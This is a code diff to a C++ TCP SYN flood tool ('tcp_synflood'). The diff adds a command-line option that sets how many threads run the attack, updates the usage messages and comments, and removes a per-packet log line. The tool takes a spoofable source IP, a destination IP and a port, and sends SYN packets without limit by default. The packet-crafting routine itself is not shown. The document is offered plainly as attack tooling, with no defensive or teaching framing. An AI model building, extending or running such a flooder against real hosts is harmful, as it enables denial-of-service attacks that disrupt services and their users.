@@ -18,9 +18,9 @@ unsigned short DST_PORT = 80;
 int main(int argc, char **argv)
 {
     int opt; // To handle args
-    unsigned int sleep_time = 10; // How long to sleep between two SYN packet launchs in ms
-    int packet_to_send = -1;      // How many packets has to be sent, below 0 is unlimited
-    unsigned short threads_count = 3;
+    unsigned int sleep_time = 10;     // How long to sleep between two SYN packet launchs in ms
+    int packet_to_send = -1;          // How many packets has to be sent, below 0 is unlimited
+    unsigned short threads_count = 1; // How many threads are going to be used
     vector<thread> threads;
 
     // Clear IP buffers before writting
@@ -28,7 +28,7 @@ int main(int argc, char **argv)
     memset(DST_IP, 0, IP_SIZE);
 
     // args handling
-    while ((opt = getopt(argc, argv, "s:d:p:t:n:")) != EOF)
+    while ((opt = getopt(argc, argv, "s:d:p:n:t:T:")) != EOF)
     {
         switch(opt)
         {
@@ -52,8 +52,12 @@ int main(int argc, char **argv)
                 sleep_time = atoi(optarg);
                 break;
             }
+            case 'T': { // How many thread to please you ? Default is 1
+                threads_count = atoi(optarg);
+                break;
+            }
             case '?': {
-                printf("Usage : ./tcp_synflood -s \"source ip\" -d \"destination ip\" -p <port> -t <time to sleep in ms>\n");
+                printf("Usage : ./tcp_synflood -s \"source ip\" -d \"destination ip\" -p <port> -n <how many packet to send> -t <time to sleep in ms> -T <how many thread to attack>\n");
             }
         }
     }
@@ -61,13 +65,16 @@ int main(int argc, char **argv)
     // Both IP address' have to be set
     if(strlen(SRC_IP) > 0 && strlen(DST_IP) > 0)
     {
-        printf("Launching attack to %s:%d from %s every %d ms\n", DST_IP, DST_PORT, SRC_IP, sleep_time);
+        printf("Launching attack to %s:%d from %s every %d ms\n with %d thread(s)", DST_IP, DST_PORT, SRC_IP, sleep_time, threads_count);
+
+        // Creating threads
         for(int i = 0; i < threads_count; i++)
         {
             std::thread th(exploit, sleep_time, packet_to_send);
             threads.push_back(move(th));
         }
 
+        // Thread joins here
         for(thread &th : threads)
         {
             if(th.joinable())
@@ -75,7 +82,7 @@ int main(int argc, char **argv)
         }
     }
     else
-        printf("Usage : ./tcp_synflood -s \"source ip\" -d \"destination ip\" -p <port> -t <time to sleep in ms>\n");
+        printf("Usage : ./tcp_synflood -s \"source ip\" -d \"destination ip\" -p <port> -n <how many packet to send> -t <time to sleep in ms> -T <how many thread to attack>\n");
 
     return EXIT_SUCCESS;
 }
@@ -135,7 +142,6 @@ void exploit(unsigned int time_to_sleep, int packet_to_send)
                 {
                     // Wait and increment
                     this_thread::sleep_for(chrono::milliseconds(time_to_sleep));
-                    cout << "Packet sent by thread " << th_id << endl;
                     packet_counter++;
                 }
             }
